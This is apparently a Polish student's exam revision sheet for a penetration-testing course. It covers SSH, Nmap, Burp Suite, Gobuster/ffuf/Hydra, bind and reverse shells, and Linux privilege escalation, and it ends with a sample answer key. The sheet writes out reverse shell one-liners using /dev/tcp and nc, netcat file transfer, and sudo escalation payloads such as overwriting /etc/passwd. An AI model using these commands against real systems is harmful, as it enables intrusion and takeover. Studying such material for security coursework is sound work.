# ZMI — Powtórka do egzaminu

---

## 1. Podstawy Linux

### SSH (Secure Shell)
Protokół sieciowy do **bezpiecznego, szyfrowanego** zdalnego logowania i przesyłania danych między komputerami. Zastąpił niezaszyfrowany **Telnet**. Dwie metody uwierzytelniania: **hasłem** (proste, mniej bezpieczne) oraz **kluczem** (para prywatny/publiczny — bezpieczniejsze).

Logika kluczy: klucz **publiczny** (`id_rsa.pub`) trafia na serwer do `~/.ssh/authorized_keys`, klucz **prywatny** (`id_rsa`) zostaje u użytkownika.

| Polecenie | Działanie |
|---|---|
| `ssh-keygen` | generuje parę kluczy (prywatny + publiczny) |
| `ssh-copy-id user@host` | automatycznie dopisuje klucz publiczny do `authorized_keys` |
| `scp ~/.ssh/id_rsa.pub user@host:.ssh/authorized_keys` | ręczne przesłanie klucza (uwaga: **nadpisuje** plik) |
| `chmod 700 ~/.ssh` | katalog `.ssh` musi mieć poprawne uprawnienia |
| `ssh user@host` | logowanie |
| `ssh -i klucz user@host` | logowanie wskazanym kluczem prywatnym |
| `chmod 600 klucz_prywatny` | klucz prywatny wymaga restrykcyjnych uprawnień |

### Ważne katalogi (Linux Filesystem Hierarchy)
| Katalog | Zawartość |
|---|---|
| `/bin` | podstawowe polecenia i pliki wykonywalne (`ls`, `cp`, `mv`) |
| `/dev` | pliki urządzeń (`/dev/sda`, `/dev/tty`) |
| `/etc` | pliki konfiguracyjne (`passwd`, `fstab`, `hosts`) |
| `/home` | katalogi domowe użytkowników |
| `/media` | automatyczne montowanie nośników zewnętrznych |
| `/tmp` | pliki tymczasowe (kasowane po restarcie) |
| `/var` | dane zmienne — logi (`/var/log`), cache, kolejki |

### Skróty terminala
| Skrót | Działanie |
|---|---|
| `Ctrl+C` | zatrzymuje działający program |
| `Ctrl+Z` | wstrzymuje proces i przenosi go w tło (`fg`/`bg` przywraca) |
| `Ctrl+U / K / W` | kasuje: do początku linii / do końca / poprzednie słowo |
| `Ctrl+Y` | wkleja skasowany fragment |
| `Ctrl+D` | zamyka sesję (jak `exit`) |
| `Ctrl+L` | czyści ekran (jak `clear`) |
| `Ctrl+R` | przeszukiwanie historii komend |
| `!!` / `!nazwa` / `history` | powtórz ostatnią / ostatnią zaczynającą się od "nazwa" / lista poleceń |

### Kali Linux
Dystrybucja oparta na **Debianie**, przeznaczona do testów penetracyjnych. Może działać w trybie **Live** (bez instalacji). Preinstalowane narzędzia: **Metasploit** (framework do eksploitacji), **Nmap** (skaner sieciowy), **Wireshark** (analiza ruchu), **John the Ripper** (łamanie haseł), **Burp Suite** (testy web).

---

## 2. Enumeracja lokalna (przydatne polecenia)

**Użytkownicy / system:** `whoami`, `id` (UID/GID/grupy), `who`/`w`, `last` (historia logowań), `cat /etc/passwd`, `env`, `echo $USER`.

**Wersja systemu:** `uname -a` (jądro, host, architektura), `cat /etc/os-release`, `cat /etc/issue`, `cat /proc/version`.

**Sprzęt:** `lscpu`/`cat /proc/cpuinfo`, `free -h`/`cat /proc/meminfo`, `lspci`, `lsusb`, `lsblk`, `df -h`.

**Sieć:** `ip a` (interfejsy/IP), `ip r` (routing), `ip n` (tablica sąsiadów ARP), `cat /etc/resolv.conf` (DNS), `ss -tlp` (nasłuchujące porty TCP + proces), `ss -tp`.

**Procesy:** `ps aux` (wszystkie procesy), `ps auxf` (drzewo), `top` (na żywo).

**Pliki i wyszukiwanie:**
| Polecenie | Działanie |
|---|---|
| `find / -name '*.conf' 2>/dev/null` | szuka plików w całym systemie, `2>/dev/null` ignoruje błędy dostępu |
| `locate .conf` | szybkie wyszukiwanie z bazy danych |
| `grep sh /etc/passwd` | linie zawierające "sh" (aktywne powłoki) |
| `grep -v nologin /etc/passwd` | linie **bez** "nologin" (użytkownicy z powłoką) |

**Cron:** `cat /etc/crontab` (globalne zadania), `crontab -e` (edycja zadań użytkownika). Format: `* * * * *` = co minutę. Zadania cron ze **złymi uprawnieniami** to typowy wektor eskalacji.

---

## 3. Enumeracja sieci

### Nmap (Network Mapper)
Narzędzie **open source** do skanowania portów, wykrywania hostów, usług i systemów operacyjnych (fingerprinting). Dostępne na wielu platformach; ma GUI (**Zenmap**) i silnik skryptów **NSE** (Nmap Scripting Engine).

**Kluczowe flagi (najważniejsze na egzamin):**
| Flaga | Znaczenie |
|---|---|
| `-sS` | **Stealth/SYN scan** (domyślny, nie kończy handshake) |
| `-sT` | pełne skanowanie **TCP** (connect) |
| `-sU` | skanowanie portów **UDP** |
| `-sV` | wykrywanie **wersji** usług |
| `-sC` | uruchamia **domyślne skrypty** NSE |
| `-A` | agresywny: `-sV` + `-sC` + `-O` + traceroute |
| `-O` / `--osscan-guess` | wykrywanie / zgadywanie **systemu operacyjnego** |
| `-p-` | skanuje **wszystkie** porty; `-p 80,443` konkretne |
| `-sn` | tylko wykrycie hostów (**bez** skanowania portów) |
| `-Pn` | traktuje hosta jako online (pomija ping) |
| `-n` | nie wykonuje zapytań DNS |
| `-vv` | wyniki na bieżąco (verbose) |
| `-h` | lista wszystkich opcji |

> Flagi można łączyć: `nmap -sT -sV -sC -O --osscan-guess 192.168.1.10`

**Alternatywy dla Nmap:** Masscan (bardzo szybki), Unicornscan, Zmap (duże sieci), RustScan (szybki, integracja z Nmap).

**Zaawansowana enumeracja:** DNS (`dnsrecon`, `Fierce`, `Sublist3r`), SNMP (`snmpwalk`), systemy kontroli wersji (`Gitwalk`, `Gitdump`). Na Windows: PowerShell (`Test-NetConnection`, `Get-NetTCPConnection`), **SharpHound** (Active Directory), Advanced IP Scanner.

---

## 4. Podstawy Web

### Burp Suite
**Kompleksowe narzędzie do testowania bezpieczeństwa aplikacji webowych** (proxy HTTP/S). Wykrywa podatności typu SQL injection, XSS, błędy konfiguracji. Wersje: **Community** (darmowa, ręczna analiza) i **Professional** (płatna, automatyczny skaner podatności).

| Zakładka Burp | Funkcja |
|---|---|
| **HTTP History** | rejestruje wszystkie żądania/odpowiedzi HTTP |
| **Proxy → Intercept** | przechwytywanie i modyfikacja ruchu w czasie rzeczywistym |
| **Repeater** | ręczna edycja i **ponowne wysyłanie** żądań |
| **Intruder** | **automatyzacja** ataków (brute force, fuzzing) |
| **Decoder** | kodowanie/dekodowanie (Base64, URL, hex) |

**Alternatywy:** OWASP ZAP (najlepsza darmowa, ma automatyczny skaner), Fiddler (.NET/Windows), Mitmproxy (CLI + skrypty Python), Charles Proxy (aplikacje mobilne iOS/Android). Do podstaw wystarczą też DevTools przeglądarki (zakładka Network).

### Deobfuskacja
**Proces przywracania czytelnej i zrozumiałej postaci kodu** (odwrotność obfuskacji — celowego utrudniania czytelności kodu). *Nie* jest to szyfrowanie ani kompresja.

---

## 5. Enumeracja Web (brute-force zasobów)

Szukanie **ukrytych** katalogów/plików metodą **ataków słownikowych** (słowniki np. z pakietu `seclists`, ścieżka `/usr/share/seclists/`). Typowe znaleziska: panele admina (`/admin`, `/login`), pliki konfiguracyjne z danymi dostępowymi, backupy (`.zip`, `.sql`), stare wersje aplikacji.

| Narzędzie | Opis |
|---|---|
| **Gobuster** | brute-force katalogów/plików, vhostów i subdomen |
| **ffuf** (Fuzz Faster U Fool) | szybki fuzzer HTTP; słowo wstawia w miejsce `FUZZ` |
| DirBuster / DIRB | brute-force katalogów |
| Wfuzz | fuzzing katalogów **i parametrów** aplikacji |

> **ffuf domyślnie używa protokołu HTTP.**

**Schematy poleceń (do rozpoznania, nie do wkuwania):**
- Katalogi: `gobuster dir -u http://cel/ -w słownik.txt`
- ffuf: `ffuf -w słownik.txt -u http://cel/FUZZ`
- vhost/subdomeny: `gobuster vhost -u ... --append-domain` lub `ffuf ... -H 'Host: FUZZ.domena'`
- Filtrowanie rozmiaru odpowiedzi: `-fs <rozmiar>`; certyfikat samopodpisany: `-k`

### Hydra
Narzędzie do **ataków siłowych** na hasła/loginy w wielu protokołach (HTTP, FTP, SSH i in.).
- `-l nazwa` — login; `-L` — lista loginów
- `-p hasło` — hasło; `-P słownik.txt` — słownik haseł
- Moduł formularza: `https-post-form` z placeholderem `^PASS^` i komunikatem błędu.

---

## 6. Transfer plików przez protokoły sieciowe

### TCP vs UDP (częsty temat)
| | **TCP** | **UDP** |
|---|---|---|
| Połączenie | tak (**three-way handshake**) | nie (bezpołączeniowy) |
| Niezawodność | potwierdzenia + retransmisja | brak gwarancji dostarczenia |
| Kolejność | zachowana | może być zaburzona |
| Zastosowanie | HTTP, FTP, SMB, SCP | strumienie wideo, gry online |
| Warstwa | transportowa (4) | transportowa (4) |

Protokoły warstw wyższych (HTTP/HTTPS, FTP, SMB, SCP) opierają się na **niezawodności TCP**.

### Protokoły aplikacyjne
| Protokół | Opis | Szyfrowanie |
|---|---|---|
| **HTTP** / **HTTPS** | komunikacja przeglądarka–serwer | HTTP nie; HTTPS przez SSL/TLS |
| **FTP** / **FTPS** | przesyłanie plików klient-serwer | FTP nie; FTPS przez SSL/TLS |
| **SMB** | udostępnianie plików/drukarek w sieci lokalnej | od SMB 3.0 tak |
| **SCP** | bezpieczna kopia plików — **działa po SSH** | tak (SSH) |

**Szybkie serwery:** `python3 -m http.server 80`, `python3 -m pyftpdlib -p 21`, `smbserver.py` (impacket), Apache2 (`a2enmod ssl` dla HTTPS).

**Transfer przez nc/socat:**
- Pobieranie: `nc IP PORT > plik` / `socat -u tcp-connect:IP:PORT open:plik,creat`
- Wysyłanie: `cat plik | nc IP PORT` / `socat -u file:plik tcp-listen:PORT,reuseaddr`
- UDP: dodaj `-u` do `nc` (np. `nc -u IP PORT`)

---

## 7. Zdalne powłoki (Remote Shells)

Pozwalają zdalnie wykonywać polecenia powłoki na maszynie celu. Działają w modelu **klient-serwer**: **serwer nasłuchuje**, **klient się łączy**. Historycznie: Telnet (bez szyfrowania) → SSH (szyfrowany standard).

### Bind shell vs Reverse shell (KLUCZOWE)
| | Kto nasłuchuje (serwer) | Kto się łączy (klient) |
|---|---|---|
| **Bind shell** | **Cel/ofiara** otwiera port i czeka | **Atakujący** inicjuje połączenie |
| **Reverse shell** | **Atakujący** nasłuchuje | **Cel/ofiara** łączy się zwrotnie |

> Reverse shell często **omija firewall**, bo połączenie wychodzi od ofiary na zewnątrz.
> Uwaga na pytanie egzaminacyjne: *„W bind shellu atakujący inicjuje połączenie do nasłuchującej ofiary"* — to **prawda**.

**Reverse shell (atakujący nasłuchuje):**
```
# Atakujący:  nc -lvp <port>
# Cel:        nc <ip_atakującego> <port> -e /bin/bash
# Cel (bash): bash -i >& /dev/tcp/<ip_atakującego>/<port> 0>&1
```

**Bind shell (cel nasłuchuje):**
```
# Cel:        nc -lvp <port> -e /bin/bash
# Atakujący:  nc <ip_celu> <port>
```

**Narzędzia:** `nc`/`netcat`, `socat` (lepszy, pełne TTY), `bash`, Metasploit, Empire.
**Uwaga:** `nmap` **nie** służy do uzyskiwania zdalnej powłoki (to skaner).

### Hardening SSH (dobre praktyki)
- `PermitRootLogin no` — wyłączenie logowania roota
- `AllowUsers` — ograniczenie do wybranych użytkowników
- `PasswordAuthentication no` — tylko klucze
- Zmiana domyślnego portu (22) **nie jest** realnym zabezpieczeniem, tylko utrudnieniem.

---

## 8. Eskalacja uprawnień i wykrywanie backdoorów

**Backdoor** = **ukryte wejście do systemu omijające uwierzytelnienie**. Cel serii zadań: eskalacja do **root**.

### Narzędzia analizy
- **GTFOBins** (`gtfobins.github.io`) — baza legalnych narzędzi Unix/Linux nadużywalnych do eskalacji, obejścia zabezpieczeń, zdalnych powłok. Np. `tar`, `vim`, `service`, `python3` mogą uruchomić powłokę.
- **linPEAS** (`linpeas.sh`) — automatyczna enumeracja podatności. Bywa niedokładny — generuje **false-positive**.

### SUID / SGID
```
find / -type f -perm /6000 2>/dev/null
```
> **Wyświetla wszystkie pliki zwykłe z ustawionym bitem SUID/SGID** (`/6000` = SUID 4000 + SGID 2000). Bit SUID = plik uruchamia się z uprawnieniami właściciela (często root) → wektor eskalacji.
> Porównanie z czystym systemem: `find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null`.

### sudo
| Flaga | Znaczenie |
|---|---|
| `sudo -l` | **lista poleceń** dostępnych przez sudo dla użytkownika |
| `sudo -k` | unieważnia zapamiętane hasło (cache) |
| `sudo su` | przejście na roota (gdy dozwolone) |

**Typowe wektory eskalacji (z GTFOBins):**
- `sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"`
- `sudo vim` → `:!bash`
- `sudo service ../../bin/bash`
- Zapis do `/etc/passwd` (np. root bez hasła → `su`) lub nadpisanie przez `sudo curl file:// -o /etc/passwd`
- `bash` **bez** `-p` ignoruje SUID i cofa uprawnienia — dlatego przy SUID-bash używa się `-p`.

### Historia przypadków (dlaczego to ważne)
Uber (2016, backup z kluczami API), Equifax (2017, niezałatany serwer), NASA (2018), Facebook (2019, hasła plaintext), Microsoft (2021, otwarte logi) — wycieki przez źle zabezpieczone/ukryte zasoby.

---

## Ściąga końcowa — przykładowy egzamin

| # | Pytanie | Odpowiedź | Dlaczego |
|---|---|---|---|
| 1 | Narzędzie do brute-force enumeracji HTTP | **A — gobuster** | nmap=skaner, hashcat=łamanie haseł, netstat=połączenia |
| 2 | Flaga skanowania UDP w nmap | **B — `-sU`** | `-sT` TCP connect, `-sS` SYN, `-sA` ACK |
| 3 | Różnica bind vs reverse shell | **A** | w bind shellu atakujący **inicjuje** połączenie do nasłuchującej ofiary |
| 4 | Które NIE daje zdalnej powłoki | **C — nmap** | socat/nc/netcat dają powłokę; nmap tylko skanuje |
| 5 | Domyślny protokół ffuf | **B — HTTP** | ffuf to fuzzer HTTP |
| 6 | Czym jest deobfuskacja | **D** | przywracanie czytelnej postaci kodu |
| 7 | Czym jest backdoor | **B** | ukryte wejście omijające uwierzytelnienie |
| 8 | `find / -type f -perm /6000 2>/dev/null` | **B** | pliki z bitem SUID/SGID |
| 9 | Do czego służy Burp Suite | **C** | testowanie bezpieczeństwa aplikacji webowych |
| 10 | Flaga sudo — lista poleceń | **C — `-l`** | `-k` czyści cache, `-s` powłoka, `-r` rola |
